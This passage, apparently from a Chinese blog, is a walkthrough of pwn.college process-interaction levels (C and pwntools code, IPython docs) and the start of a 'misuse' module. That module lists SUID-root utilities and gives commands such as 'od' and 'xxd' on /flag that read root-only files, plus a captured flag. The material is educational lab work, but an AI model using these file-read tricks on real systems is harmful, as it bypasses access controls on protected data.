class="hljs-keyword">if</span> (dup2(fd1,  fd2) == <span class="hljs-number">-1</span>) &#123; perror(<span class="hljs-string">&quot;Could not duplicate pipe end&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>); &#125;<br>    __close(fd1);<br>&#125;<br><br><span class="hljs-comment">// Start program at argv[0] with arguments argv.</span><br><span class="hljs-comment">// Set up new stdin, stdout and stderr.</span><br><span class="hljs-comment">// Puts references to new process and pipes into `p`.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">call</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* argv[], struct subprocess * p)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> child_in[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_out[<span class="hljs-number">2</span>]; <span class="hljs-keyword">int</span> child_err[<span class="hljs-number">2</span>];<br>    pipe(child_in); pipe(child_out); pipe(child_err);<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        __close(<span class="hljs-number">0</span>); __close(<span class="hljs-number">1</span>); __close(<span class="hljs-number">2</span>);                                 <span class="hljs-comment">// __close parent pipes</span><br>        __close(child_in[<span class="hljs-number">1</span>]); __close(child_out[<span class="hljs-number">0</span>]); __close(child_err[<span class="hljs-number">0</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        mv_fd(child_in[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>); mv_fd(child_out[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>); mv_fd(child_err[<span class="hljs-number">1</span>], <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">char</span>* envp[] = &#123; <span class="hljs-string">&quot;\0&quot;</span> &#125;;<br>        <span class="hljs-comment">//write(1,&quot;what the fuck&quot;, 30);</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;failure in exec&quot;</span>, <span class="hljs-number">30</span>) ;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        __close(child_in[<span class="hljs-number">0</span>]); __close(child_out[<span class="hljs-number">1</span>]); __close(child_err[<span class="hljs-number">1</span>]); <span class="hljs-comment">// unused child pipe ends</span><br>        p-&gt;pid = pid;<br>        p-&gt;<span class="hljs-built_in">stdin</span> = child_in[<span class="hljs-number">1</span>];   <span class="hljs-comment">// parent wants to write to subprocess child_in</span><br>        p-&gt;<span class="hljs-built_in">stdout</span> = child_out[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_out</span><br>        p-&gt;<span class="hljs-built_in">stderr</span> = child_err[<span class="hljs-number">0</span>]; <span class="hljs-comment">// parent wants to read from subprocess child_err</span><br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from parent process!\n&quot;</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess</span> <span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">char</span>* argv[] = &#123;<span class="hljs-string">&quot;/challenge/embryoio_level40&quot;</span>, <span class="hljs-string">&quot;\0&quot;</span>&#125;;<br>    call(argv, &amp;proc);<br><span class="hljs-comment">//    mv_fd(STDIN_FILENO, proc.stdin);</span><br><span class="hljs-comment">//    mv_fd(STDOUT_FILENO, proc.stdout);</span><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">2048</span>];<br>    <span class="hljs-keyword">char</span> buf_[<span class="hljs-number">2048</span>];<br>    read(proc.<span class="hljs-built_in">stdout</span>, buf, <span class="hljs-number">2048</span>);<br>    read(proc.<span class="hljs-built_in">stderr</span>, buf_,<span class="hljs-number">2048</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf_);<br>    waitpid(proc.pid);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p>真的是相当多, 见<a href="https://pwn.college/modules/interaction">这里</a> </p><p>有个<a href="https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf">pwntools-cheatsheet</a>比较特别, 应该能用上</p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><blockquote><p>怎么会有一百多个, 也太离谱了</p></blockquote><p>基本连接方式: ssh</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ssh-keygen -f pwnkey<br>cat pwnkey.pub #copy public key<br>ssh -i pwnkey hacker@dojo.pwn.college -v<br></code></pre></div></td></tr></table></figure><p>在/challenge/[对应文件]中, 直接执行即可</p><ul><li>从远程机器复制文件:</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">scp -i pwnkey hacker@dojo.pwn.college:/challenge/checker.py ./<br></code></pre></div></td></tr></table></figure><h3 id="level-几来着"><a href="#level-几来着" class="headerlink" title="level(几来着)"></a>level(几来着)</h3><p>要求以0个环境变量运行程序, 可以使用execve函数, env命令, exec命令三种方法</p><blockquote><p>其余的大概就是加环境变量, 加参数, 写在脚本里之类的简单题</p></blockquote><h3 id="level15新东西"><a href="#level15新东西" class="headerlink" title="level15新东西"></a>level15新东西</h3><p>新的一个东西: ipython, An enhenced interactive python, 增加了一些特别的功能, 还有个说明书放在本level的末尾.</p><p>ssh接上后, 进入ipython, 然后Ctrl+O就可以编辑多行脚本了, 使用的还是pwntools, 算是熟悉一点.</p><p>有两种方法: </p><ol><li><code>!exec /challenge/embryoio_level15</code> </li><li>用<code>pwn.process()</code> </li></ol><h3 id="Python-–-An-enhanced-Interactive-Python"><a href="#Python-–-An-enhanced-Interactive-Python" class="headerlink" title="Python – An enhanced Interactive Python"></a>Python – An enhanced Interactive Python</h3><p>IPython offers a fully compatible replacement for the standard Python<br>interpreter, with convenient shell features, special commands, command<br>history mechanism and output results caching.</p><p>At your system command line, type ‘ipython -h’ to see the command line<br>options available. This document only describes interactive features.</p><h5 id="GETTING-HELP"><a href="#GETTING-HELP" class="headerlink" title="GETTING HELP"></a>GETTING HELP</h5><p>Within IPython you have various way to access help:</p><p>  <strong>?     -&gt; Introduction and overview of IPython’s features (this screen).</strong><br>  object?   -&gt; Details about ‘object’.<br>  object??  -&gt; More detailed, verbose information about ‘object’.<br>  %quickref -&gt; Quick reference of all IPython specific syntax and magics.<br>  help      -&gt; Access Python’s own help system.</p><p>If you are in terminal IPython you can quit this screen by pressing <code>q</code>.</p><h5 id="MAIN-FEATURES"><a href="#MAIN-FEATURES" class="headerlink" title="MAIN FEATURES"></a>MAIN FEATURES</h5><ul><li><p>Access to the standard Python help with object docstrings and the Python<br>  manuals. Simply type ‘help’ (no quotes) to invoke it.</p></li><li><p>Magic commands: type %magic for information on the magic subsystem.</p></li><li><p>System command aliases, via the %alias command or the configuration file(s).</p></li><li><p>Dynamic object information:</p><p>  Typing ?word or word? prints detailed information about an object. Certain<br>  long strings (code, etc.) get snipped in the center for brevity.</p><p>  Typing ??word or word?? gives access to the full information without<br>  snipping long strings. Strings that are longer than the screen are printed<br>  through the less pager.</p><p>  The ?/?? system gives access to the full source code for any object (if<br>  available), shows function prototypes and other useful information.</p><p>  If you just want to see an object’s docstring, type ‘%pdoc object’ (without<br>  quotes, and without % if you have automagic on).</p></li><li><p><strong>Tab completion in the local namespace:</strong> </p><p>  At any time, hitting tab will complete any available python commands or<br>  variable names, and show you a list of the possible completions if there’s<br>  no unambiguous one. It will also complete filenames in the current directory.</p></li><li><p><strong>Search previous command history in multiple ways:</strong> </p><ul><li><p>Start typing, and then use arrow keys up/down or (Ctrl-p/Ctrl-n) to search<br>  through the history items that match what you’ve typed so far.</p></li><li><p>Hit Ctrl-r: opens a search prompt. Begin typing and the system searches<br>  your history for lines that match what you’ve typed so far, completing as<br>  much as it can.</p></li><li><p>%hist: search history by index.</p></li></ul></li><li><p><strong>Persistent command history across sessions.</strong></p></li><li><p>Logging of input with the ability to save and restore a working session.</p></li><li><p><strong>System shell with !. Typing !ls will run ‘ls’ in the current directory.</strong></p></li><li><p>The reload command does a ‘deep’ reload of a module: changes made to the<br>  module since you imported will actually be available without having to exit.</p></li><li><p>Verbose and colored exception traceback printouts. See the magic xmode and<br>  xcolor functions for details (just type %magic).</p></li><li><p>Input caching system:</p><p>  IPython offers numbered prompts (In/Out) with input and output caching. All<br>  input is saved and can be retrieved as variables (besides the usual arrow<br>  key recall).</p><p>  The following GLOBAL variables always exist (so don’t overwrite them!):<br>  _i: stores previous input.<br>  _ii: next previous.<br>  _iii: next-next previous.<br>  _ih : a list of all input _ih[n] is the input from line n.</p><p>  Additionally, global variables named _i&lt;n&gt; are dynamically created (&lt;n&gt;<br>  being the prompt counter), such that _i&lt;n&gt; == _ih[&lt;n&gt;]</p><p>  For example, what you typed at prompt 14 is available as _i14 and _ih[14].</p><p>  You can create macros which contain multiple input lines from this history,<br>  for later re-execution, with the %macro function.</p><p>  The history function %hist allows you to see any part of your input history<br>  by printing a range of the _i variables. Note that inputs which contain<br>  magic functions (%) appear in the history with a prepended comment. This is<br>  because they aren’t really valid Python code, so you can’t exec them.</p></li><li><p>Output caching system:</p><p>  For output that is returned from actions, a system similar to the input<br>  cache exists but using _ instead of _i. Only actions that produce a result<br>  (NOT assignments, for example) are cached. If you are familiar with<br>  Mathematica, IPython’s _ variables behave exactly like Mathematica’s %<br>   variables.</p><p>  The following GLOBAL variables always exist (so don’t overwrite them!):<br>  _ (one underscore): previous output.<br>  __ (two underscores): next previous.<br>  ___ (three underscores): next-next previous.</p><p>  Global variables named _<n> are dynamically created (<n> being the prompt<br>  counter), such that the result of output <n> is always available as _<n>.</p><p>  Finally, a global dictionary named _oh exists with entries for all lines<br>  which generated output.</p></li><li><p><strong><mark>Directory history:</mark></strong> </p><p>  <strong>Your history of visited directories is kept in the global list _dh, and the</strong><br>  <strong>magic %cd command can be used to go to any entry in that list.</strong> </p></li><li><p>Auto-parentheses and auto-quotes (adapted from Nathan Gray’s LazyPython)</p><ol><li><p>Auto-parentheses</p><p> Callable objects (i.e. functions, methods, etc) can be invoked like<br> this (notice the commas between the arguments)::</p><div class="hljs code-wrapper"><pre><code> In [1]: callable_ob arg1, arg2, arg3</code></pre></div><p> and the input will be translated to this::</p><div class="hljs code-wrapper"><pre><code> callable_ob(arg1, arg2, arg3)</code></pre></div><p> This feature is off by default (in rare cases it can produce<br> undesirable side-effects), but you can activate it at the command-line<br> by starting IPython with <code>--autocall 1</code>, set it permanently in your<br> configuration file, or turn on at runtime with <code>%autocall 1</code>.</p><p> You can force auto-parentheses by using ‘/‘ as the first character<br> of a line.  For example::</p><div class="hljs code-wrapper"><pre><code>  In [1]: /globals             # becomes &#39;globals()&#39;</code></pre></div><p> Note that the ‘/‘ MUST be the first character on the line!  This<br> won’t work::</p><div class="hljs code-wrapper"><pre><code>  In [2]: print /globals    # syntax error</code></pre></div><p> In most cases the automatic algorithm should work, so you should<br> rarely need to explicitly invoke /. One notable exception is if you<br> are trying to call a function with a list of tuples as arguments (the<br> parenthesis will confuse IPython)::</p><div class="hljs code-wrapper"><pre><code>  In [1]: zip (1,2,3),(4,5,6)  # won&#39;t work</code></pre></div><p> but this will work::</p><div class="hljs code-wrapper"><pre><code> In [2]: /zip (1,2,3),(4,5,6) ------&gt; zip ((1,2,3),(4,5,6)) Out[2]= [(1, 4), (2, 5), (3, 6)]</code></pre></div><p>IPython tells you that it has altered your command line by<br>displaying the new command line preceded by –&gt;.  e.g.::</p><div class="hljs code-wrapper"><pre><code> In [18]: callable list -------&gt; callable (list)</code></pre></div></li><li><p><mark>Auto-Quoting</mark> </p><p> You can force auto-quoting of a function’s arguments by using ‘,’ as<br> the first character of a line.  For example::</p><div class="hljs code-wrapper"><pre><code>  In [1]: ,my_function /home/me   # becomes my_function(&quot;/home/me&quot;)</code></pre></div><p> If you use ‘;’ instead, the whole argument is quoted as a single<br> string (while ‘,’ splits on whitespace)::</p><div class="hljs code-wrapper"><pre><code>  In [2]: ,my_function a b c   # becomes my_function(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;)  In [3]: ;my_function a b c   # becomes my_function(&quot;a b c&quot;)</code></pre></div><p> Note that the ‘,’ MUST be the first character on the line!  This<br> won’t work::</p><div class="hljs code-wrapper"><pre><code>  In [4]: x = ,my_function /home/me    # syntax error</code></pre></div></li></ol></li></ul><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>从这题开始使用这个脚本, glob可根据 Unix 终端所用规则找出所有匹配特定模式的路径名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE) <br>p.sendline(<span class="hljs-string">&quot;password&quot;</span>)    <span class="hljs-comment"># 要加这一个</span><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>这题检查参数argv[1]. 要注意的是pwntools的process方法以前我都是直接使用process(“file/path”), 实际上是写到了argv[]的第0个位置, 如果<code>executable(Path to the binary to execute)</code>为None, pwntools则会使用argv[0], 这就是为什么往参数里写路径就可以执行的原因.</p><p>写成这样即可:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>)+[<span class="hljs-string">&quot;gdncphvdkz&quot;</span>] , stdout=pwn.PIPE, stdin=pwn.PIPE) <br><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure><h3 id="level18-21"><a href="#level18-21" class="headerlink" title="level18-21"></a>level18-21</h3><ul><li>18: 是环境变量, 在process的参数里加个<code>env=&#123;“balabala”=“blabla”&#125;</code>就可以了.</li><li>19: 是重定向stdin.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">&quot;kmtxemmo\n&quot;</span>)<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>))<br><br><span class="hljs-built_in">print</span>(p.read().decode()) <br></code></pre></div></td></tr></table></figure><p>有一个问题: 上面的代码应该都是正确的, 但是只有再补充一句p.interactive()的时候最后两行flag才显示出来, 原因暂未知晓</p><ul><li>20: </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/tkpich&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), stdin=pwn.PIPE)<br></code></pre></div></td></tr></table></figure><ul><li>21<br>  需要清空环境变量.<br>  注意到process这个函数中的env默认会继承python的环境变量就可以了, 必须手动清空</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE, env=&#123;&#125;)<br><br><span class="hljs-built_in">print</span>(p.read().decode())<br></code></pre></div></td></tr></table></figure><h3 id="level-22-28"><a href="#level-22-28" class="headerlink" title="level 22-28"></a>level 22-28</h3><ul><li>22: 这部分是使用命令行执行python来执行程序的,  比较简单.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>))<br>p.interactive()<br></code></pre></div></td></tr></table></figure><ul><li>23-28: 重复一遍上面的工作, 比如0 environment, redirect stdin and out, 等等这些.</li></ul><h3 id="level-29-34"><a href="#level-29-34" class="headerlink" title="level 29-34"></a>level 29-34</h3><p>从这个开始就要编译C程序了, 29写下面这一段, 30输入一个密码.</p><p>值得注意的是, 如果直接调用execve, 那么会导致bash在执行.</p><p>如果没有waitpid, 那么子进程会被/docker/init(在我的ubuntu20.04上是/sbin/init)接管. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level30&quot;</span>, argv, envp);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><strong>31:</strong> 真的绝了, “a”原本写的是””, 父进程都不对, 过了一会儿重新编译又好了, 莫名其妙.</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br><br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-comment">//int r=execve(&quot;/challenge/embryoio_level31&quot;, argv, envp);</span><br>        <span class="hljs-keyword">int</span> r = execl(<span class="hljs-string">&quot;/challenge/embryoio_level31&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>32: 直接修改envp好像会出问题, 原因未知. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">char</span>* argvs[<span class="hljs-number">3</span>];<br>    argvs[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;jxdefy=fbilpksemj&quot;</span>;    <span class="hljs-comment">//暂且先手动设置吧</span><br>    argvs[<span class="hljs-number">2</span>]=<span class="hljs-literal">NULL</span>;<br>    argvs[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;sldkfj&quot;</span>;<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r = execle(<span class="hljs-string">&quot;/challenge/embryoio_level32&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>, argvs);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>33: 这个就是c语言版本的重定位, 还附带父进程检查的那种. 考虑到execve系列函数会直接继承原来进程的大部分属性, 比如输入输出流, 所以直接对c程序重定向即可, 子进程直接继承.</li><li>34: 输出重定向.</li></ul><h3 id="level35"><a href="#level35" class="headerlink" title="level35-"></a>level35-</h3><ul><li><p>35: 用脚本运行, 可以不需要fork, 直接execve</p></li><li><p>36: 输出要是到cat的PIPE, 直接在命令行里输入: <code>./c | cat</code>即可</p></li><li><p>37: <code>./c | grep -E &quot;*&quot;</code> 结束</p></li><li><p>38: <code>./c | sed &quot;=&quot;</code> </p></li><li><p>39: <code>./c  | rev | rev</code> </p></li><li><p>40: 使用管道重定向stdin, 去看了下c中的PIPE操作.暂时没有发现怎么用在这道题目上.</p><p><del>直接来一手三重套娃, 这样子cat就不会马上终止了</del>. md不用也可以, 是我想复杂了.</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">./cat | cat | /challenge/embryoio_level40<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//cat.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">int</span> fd = argc == <span class="hljs-number">1</span> ? <span class="hljs-number">0</span> : open(argv[<span class="hljs-number">1</span>],<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">while</span> ((n = read(fd,buf,<span class="hljs-number">1024</span>)) &gt; <span class="hljs-number">0</span> &amp;&amp; write(<span class="hljs-number">1</span>,buf,n) &gt; <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>41: 重定向stdout. 一样做法.</li><li>42: <code>bash x.sh | cat</code></li><li>43: grep</li><li>44: sed</li><li>45: rev</li><li>46: 我累了</li></ul><h3 id="level"><a href="#level" class="headerlink" title="level??"></a>level??</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>pwn.context.log_level = <span class="hljs-string">&quot;DEBUG&quot;</span><br>p2 = pwn.process([<span class="hljs-string">&quot; /usr/bin/sed&quot;</span>, <span class="hljs-string">&quot;-e&quot;</span>, <span class="hljs-string">&quot;s/x/×/&quot;</span>])<br>p1 = pwn.process(glob.glob( <span class="hljs-string">&quot; /chailenge/enbryo* &quot;</span>)，stdout=p2.stdin)<br><span class="hljs-built_in">print</span>(p2.readall())<br></code></pre></div></td></tr></table></figure><h1 id="module-2-misuse"><a href="#module-2-misuse" class="headerlink" title="module 2-misuse"></a>module 2-misuse</h1><ul><li><p><a href="https://wiki.archlinux.org/title/File_permissions_and_attributes">文件权限</a> </p></li><li></li></ul><h2 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h2><p>这部分的题目就是利用被设置suid的程序来以root的权限去读文件, 无论看起来是有多么的不可能.</p><p><code>cat head tail rev nano emacs vim od more less sort hd(hexdump) xxd base32(64) split gzip bzip2 zip&amp;unzip</code><br><code>tar ar cpio genisoimage env find make </code></p><ul><li>od: <code>od -t x8z -v -w 10 /flag</code> 硬是拼出来. </li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0000000 6c6c6f632e6e7770 714f6f417b656765 685834544b387868 4e354550757a575a  &gt;pwn.college&#123;AoOqhx8KT4XhZWzuPE5N&lt;<br>0000040 2e337a6d50723671 4d734d54557a5851 0a7d577a49314d54                   &gt;q6rPmz3.QXzUTMsMTM1IzW&#125;.&lt;<br>0000070<br></code></pre></div></td></tr></table></figure><ul><li><p><code>hd /flag</code> (hexdump)</p></li><li><p><code>xxd -c60 /flag</code> 每行60个</p></li><li><p><code>base32 